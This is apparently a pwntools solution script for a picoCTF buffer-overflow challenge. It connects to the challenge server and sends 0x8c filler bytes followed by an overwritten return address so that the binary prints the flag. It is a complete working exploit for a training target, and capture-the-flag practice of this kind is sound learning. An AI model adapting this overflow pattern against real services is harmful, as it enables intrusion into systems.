from pwn import *
p = remote("saturn.picoctf.net", 49840)

p.recvuntil(b"string!")
payload = b"A" * 0x8c + b"\x30\x15\x40\x00" # use IDA and run file exploit in os windows to do printf flag
p.sendline(payload)

p.interactive()